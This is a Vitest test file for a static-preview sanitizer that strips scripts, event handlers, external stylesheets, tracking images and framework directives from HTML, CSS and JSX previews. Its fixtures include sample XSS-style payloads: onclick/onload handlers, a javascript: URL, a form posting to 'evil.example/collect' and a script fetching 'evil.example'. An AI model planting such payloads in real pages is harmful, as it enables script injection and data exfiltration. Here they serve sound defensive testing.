import { describe, expect, it } from "vitest";
import {
  PLACEHOLDER_IMAGE_DATA_URI,
  renderJsxWireframe,
  sanitizeCss,
  sanitizeHtmlDocument,
  sanitizeHtmlFragment,
  wireframeDocument,
  type AssetResolver,
} from "../../src/lib/preview/static-preview";

const emptyResolver: AssetResolver = {
  readText: () => null,
  readAssetDataUri: () => null,
};

describe("HTML sanitization for static previews", () => {
  it("removes scripts, embeds, event handlers, and javascript: URLs", () => {
    const html = `<!DOCTYPE html><html><head>
      <script src="evil.js"></script>
      <base href="https://evil.example/">
    </head><body onload="pwn()">
      <iframe src="https://evil.example"></iframe>
      <object data="x"></object><embed src="y">
      <button onclick="steal()">Save</button>
      <a href="javascript:alert(1)">Click</a>
      <form action="https://evil.example/collect"><input name="q"></form>
      <script>fetch("https://evil.example")</script>
    </body></html>`;
    const sanitized = sanitizeHtmlDocument(html, "index.html", emptyResolver);

    expect(sanitized).not.toMatch(/<script/i);
    expect(sanitized).not.toMatch(/<iframe/i);
    expect(sanitized).not.toMatch(/<object/i);
    expect(sanitized).not.toMatch(/<embed/i);
    expect(sanitized).not.toMatch(/<base/i);
    expect(sanitized).not.toMatch(/onload=/i);
    expect(sanitized).not.toMatch(/onclick=/i);
    expect(sanitized).not.toMatch(/javascript:/i);
    expect(sanitized).not.toMatch(/action=/i);
    expect(sanitized).toContain("Save");
  });

  it("inlines local stylesheets and drops external ones", () => {
    const resolver: AssetResolver = {
      readText: (file) => (file === "popup.css" ? "body { color: red; }" : null),
      readAssetDataUri: () => null,
    };
    const html = `<html><head>
      <link rel="stylesheet" href="popup.css">
      <link rel="stylesheet" href="https://cdn.example/framework.css">
    </head><body></body></html>`;
    const sanitized = sanitizeHtmlDocument(html, "popup.html", resolver);

    expect(sanitized).toContain("<style>body { color: red; }</style>");
    expect(sanitized).not.toContain("cdn.example");
  });

  it("inlines local images as data URIs and replaces external images", () => {
    const resolver: AssetResolver = {
      readText: () => null,
      readAssetDataUri: (file) =>
        file === "icons/logo.png" ? "data:image/png;base64,AAAA" : null,
    };
    const html = `<html><body>
      <img src="icons/logo.png" alt="logo">
      <img src="https://tracker.example/pixel.png">
      <img src="missing.png">
    </body></html>`;
    const sanitized = sanitizeHtmlDocument(html, "index.html", resolver);

    expect(sanitized).toContain('src="data:image/png;base64,AAAA"');
    expect(sanitized).not.toContain("tracker.example");
    expect(sanitized).toContain(`src="${PLACEHOLDER_IMAGE_DATA_URI}"`);
  });

  it("resolves stylesheet and image paths relative to the HTML file", () => {
    const resolver: AssetResolver = {
      readText: (file) => (file === "public/styles/app.css" ? ".x{}" : null),
      readAssetDataUri: () => null,
    };
    const html = `<html><head><link rel="stylesheet" href="styles/app.css"></head></html>`;
    expect(sanitizeHtmlDocument(html, "public/index.html", resolver)).toContain("<style>.x{}</style>");
  });

  it("strips remote references from CSS", () => {
    const css = `@import url("https://evil.example/a.css");
      .a { background: url(https://evil.example/x.png); }
      .b { background: url(local.png); }`;
    const sanitized = sanitizeCss(css);
    expect(sanitized).not.toContain("@import");
    expect(sanitized).not.toContain("evil.example");
    expect(sanitized).toContain("url(local.png)");
  });

  it("removes framework directives from template fragments", () => {
    const fragment = `<div v-if="loaded" @click="open" :class="cls"><p>{{ title }}</p></div>`;
    const sanitized = sanitizeHtmlFragment(fragment, "src/App.vue", emptyResolver);
    expect(sanitized).not.toContain("@click");
    expect(sanitized).not.toContain("v-if");
    expect(sanitized).not.toContain(":class");
    expect(sanitized).not.toContain("{{");
  });
});

describe("JSX wireframe reconstruction", () => {
  const source = `
    import "./styles.css";
    export function Dashboard() {
      const items = ["a", "b"];
      return (
        <main className="dashboard">
          <nav className="top-nav"><a href="/">Home</a><a href="/settings">Settings</a></nav>
          <h1>Deployments</h1>
          {items.map((item) => (
            <MetricCard key={item} title={item} />
          ))}
          {items.length > 0 && <p>Active</p>}
          <button onClick={() => alert("hi")}>Deploy now</button>
          <img src={logoUrl} alt="logo" />
          <span>{items.length}</span>
        </main>
      );
    }
  `;

  it("keeps structure, class names, and static text", () => {
    const fragment = renderJsxWireframe(source, "src/Dashboard.tsx", "Dashboard")!;
    expect(fragment).toContain('<main class="dashboard">');
    expect(fragment).toContain('<nav class="top-nav">');
    expect(fragment).toContain("<h1>Deployments</h1>");
    expect(fragment).toContain("Deploy now");
  });

  it("never emits scripts or event handlers", () => {
    const fragment = renderJsxWireframe(source, "src/Dashboard.tsx", "Dashboard")!;
    expect(fragment).not.toMatch(/onclick/i);
    expect(fragment).not.toMatch(/<script/i);
    expect(fragment).not.toContain("alert(");
  });

  it("renders custom components as labeled blocks and expressions as placeholders", () => {
    const fragment = renderJsxWireframe(source, "src/Dashboard.tsx", "Dashboard")!;
    expect(fragment).toContain('data-name="MetricCard"');
    expect(fragment).toContain("rl-expr");
    expect(fragment).toContain("<p>Active</p>"); // condition && jsx renders the branch
    expect(fragment).toContain("rl-media"); // img becomes a neutral media block
  });

  it("returns null when a file contains no JSX", () => {
    expect(renderJsxWireframe("export const x = 1;", "src/x.ts")).toBeNull();
  });

  it("wraps fragments in a script-free standalone document", () => {
    const documentHtml = wireframeDocument("<p>Hi</p>", ".custom { color: blue; }");
    expect(documentHtml).toMatch(/^<!DOCTYPE html>/);
    expect(documentHtml).toContain("<p>Hi</p>");
    expect(documentHtml).toContain(".custom { color: blue; }");
    expect(documentHtml).not.toMatch(/<script/i);
  });
});
